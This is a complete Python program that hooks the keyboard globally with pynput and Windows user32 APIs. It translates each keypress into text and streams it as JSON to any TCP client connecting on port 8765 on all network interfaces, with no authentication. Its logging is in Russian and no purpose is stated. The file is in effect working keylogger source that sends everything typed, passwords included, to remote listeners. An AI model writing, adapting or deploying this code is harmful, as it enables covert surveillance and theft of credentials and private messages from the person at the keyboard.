import ctypes
import json
import socket
import sys
import threading
import time
from ctypes import wintypes
from typing import List, Optional

from pynput import keyboard

HOST = "0.0.0.0"
PORT = 8765


class ClientPool:
    def __init__(self):
        self._clients: List[socket.socket] = []
        self._lock = threading.Lock()

    def add(self, conn: socket.socket):
        with self._lock:
            self._clients.append(conn)

    def remove(self, conn: socket.socket):
        with self._lock:
            try:
                self._clients.remove(conn)
            except ValueError:
                pass
        try:
            conn.close()
        except OSError:
            pass

    def broadcast(self, message: str):
        dead: List[socket.socket] = []
        encoded = message.encode("utf-8")
        with self._lock:
            for conn in list(self._clients):
                try:
                    conn.sendall(encoded)
                except OSError:
                    dead.append(conn)
            for conn in dead:
                try:
                    self._clients.remove(conn)
                except ValueError:
                    pass
        for conn in dead:
            try:
                conn.close()
            except OSError:
                pass

    def close_all(self):
        with self._lock:
            clients = list(self._clients)
            self._clients.clear()
        for conn in clients:
            try:
                conn.close()
            except OSError:
                pass


_user32 = None
_kernel32 = None
if sys.platform == "win32":
    _user32 = ctypes.WinDLL("user32", use_last_error=True)
    _user32.GetForegroundWindow.restype = wintypes.HWND
    _user32.GetForegroundWindow.argtypes = []
    _user32.GetWindowThreadProcessId.restype = wintypes.DWORD
    _user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
    _user32.GetKeyboardLayout.restype = wintypes.HKL
    _user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
    _user32.MapVirtualKeyW.restype = wintypes.UINT
    _user32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]
    _user32.GetKeyboardState.restype = wintypes.BOOL
    _user32.GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_uint8)]
    _user32.GetKeyState.restype = ctypes.c_short
    _user32.GetKeyState.argtypes = [wintypes.INT]
    _user32.ToUnicodeEx.restype = ctypes.c_int
    _user32.ToUnicodeEx.argtypes = [
        wintypes.UINT,
        wintypes.UINT,
        ctypes.POINTER(ctypes.c_uint8),
        ctypes.c_void_p,
        ctypes.c_int,
        wintypes.UINT,
        wintypes.HKL,
    ]


def _get_active_keyboard_layout() -> wintypes.HKL:
    if _user32 is None:
        return wintypes.HKL(0)

    foreground_window = _user32.GetForegroundWindow()
    if foreground_window:
        process_id = wintypes.DWORD()
        thread_id = _user32.GetWindowThreadProcessId(
            foreground_window, ctypes.byref(process_id)
        )
        if thread_id:
            layout = _user32.GetKeyboardLayout(thread_id)
            if layout:
                return layout
    return _user32.GetKeyboardLayout(0)


def _populate_key_state_from_get_key_state(
    keyboard_state: "ctypes.Array[ctypes.c_uint8]", virtual_key: int
):
    if _user32 is None:
        return

    state = _user32.GetKeyState(virtual_key)
    pressed = 0x80 if state & 0x8000 else 0
    toggled = 0x01 if state & 0x0001 else 0
    keyboard_state[virtual_key] = pressed | toggled


_MODIFIER_VIRTUAL_KEYS = [
    0x10,  # VK_SHIFT
    0x11,  # VK_CONTROL
    0x12,  # VK_MENU (ALT)
    0x14,  # VK_CAPITAL (CAPS LOCK)
    0xA0,  # VK_LSHIFT
    0xA1,  # VK_RSHIFT
    0xA2,  # VK_LCONTROL
    0xA3,  # VK_RCONTROL
    0xA4,  # VK_LMENU
    0xA5,  # VK_RMENU
]

_VK_NUMPAD_DIGITS = {0x60 + digit: str(digit) for digit in range(10)}


def _fallback_printable_from_vk(key_code: keyboard.KeyCode) -> Optional[str]:
    vk = getattr(key_code, "vk", None)
    if vk is None:
        return None

    if 0x30 <= vk <= 0x39:
        return chr(vk)
    if 0x41 <= vk <= 0x5A:
        return chr(vk).lower()

    numpad = _VK_NUMPAD_DIGITS.get(vk)
    if numpad:
        return numpad

    numpad_ops = {
        0x6A: "*",
        0x6B: "+",
        0x6D: "-",
        0x6E: ".",
        0x6F: "/",
    }
    if vk in numpad_ops:
        return numpad_ops[vk]

    oem_mapping = {
        0xBA: ";",
        0xBB: "=",
        0xBC: ",",
        0xBD: "-",
        0xBE: ".",
        0xBF: "/",
        0xC0: "`",
        0xDB: "[",
        0xDC: "\\",
        0xDD: "]",
        0xDE: "'",
        0xDF: "#",
    }
    if vk in oem_mapping:
        return oem_mapping[vk]

    return None


def _translate_keycode_windows(key_code: keyboard.KeyCode) -> Optional[str]:
    if _user32 is None:
        return None

    vk = getattr(key_code, "vk", None)
    if vk is None:
        return None

    scan_code = _user32.MapVirtualKeyW(vk, 0)
    if scan_code == 0:
        return None

    keyboard_state = (ctypes.c_uint8 * 256)()
    if not _user32.GetKeyboardState(keyboard_state):
        for virtual_key in range(256):
            _populate_key_state_from_get_key_state(keyboard_state, virtual_key)
    else:
        for virtual_key in _MODIFIER_VIRTUAL_KEYS:
            _populate_key_state_from_get_key_state(keyboard_state, virtual_key)

    buffer = ctypes.create_unicode_buffer(8)
    layout = _get_active_keyboard_layout()

    keyboard_state[vk] = keyboard_state[vk] | 0x80
    result = _user32.ToUnicodeEx(
        vk,
        scan_code,
        keyboard_state,
        buffer,
        len(buffer),
        0,
        layout,
    )

    if result == -1:
        _user32.ToUnicodeEx(
            vk,
            scan_code,
            keyboard_state,
            buffer,
            len(buffer),
            0,
            layout,
        )
        return None

    if result > 0:
        return buffer.value[:result]

    return None


def key_to_str(key):
    if key in {
        keyboard.Key.shift,
        keyboard.Key.shift_r,
        keyboard.Key.alt,
        keyboard.Key.alt_gr,
        keyboard.Key.alt_l,
        keyboard.Key.alt_r,
        keyboard.Key.ctrl,
        keyboard.Key.ctrl_l,
        keyboard.Key.ctrl_r,
    }:
        return None
    if key == keyboard.Key.caps_lock:
        return "{caps_lock}"
    if key == keyboard.Key.enter:
        return "{return}"
    if key == keyboard.Key.backspace:
        return "{backspace}"
    if key == keyboard.Key.tab:
        return "{tab}"
    if key == keyboard.Key.space:
        return " "
    if key == keyboard.Key.esc:
        return "{escape}"
    if isinstance(key, keyboard.KeyCode):
        translated = _translate_keycode_windows(key)
        if translated:
            return translated
        if key.char:
            return key.char
        fallback = _fallback_printable_from_vk(key)
        if fallback:
            return fallback
    return None


def on_press_factory(pool: ClientPool, stop_event: threading.Event):
    def on_press(key):
        if stop_event.is_set():
            return False
        key_str = key_to_str(key)
        if key_str is None:
            return True
        payload = json.dumps({"type": "key", "key": key_str, "ts": time.time()}) + "\n"
        pool.broadcast(payload)
        return True

    return on_press


def accept_connections(server_socket: socket.socket, pool: ClientPool, stop_event: threading.Event):
    server_socket.settimeout(1.0)
    while not stop_event.is_set():
        try:
            conn, addr = server_socket.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        conn.settimeout(None)
        pool.add(conn)
        print(f"[server] клиент подключен: {addr}")


def main():
    stop_event = threading.Event()
    pool = ClientPool()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen()
    print(f"[server] слушаем {HOST}:{PORT}")

    accept_thread = threading.Thread(
        target=accept_connections, args=(server_socket, pool, stop_event), daemon=True
    )
    accept_thread.start()

    listener = keyboard.Listener(on_press=on_press_factory(pool, stop_event))
    listener.start()

    try:
        while not stop_event.wait(0.1):
            pass
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        listener.stop()
        listener.join()
        stop_event.set()
        try:
            server_socket.close()
        except OSError:
            pass
        pool.close_all()
        accept_thread.join()
        print("[server] остановлен")


if __name__ == "__main__":
    main()
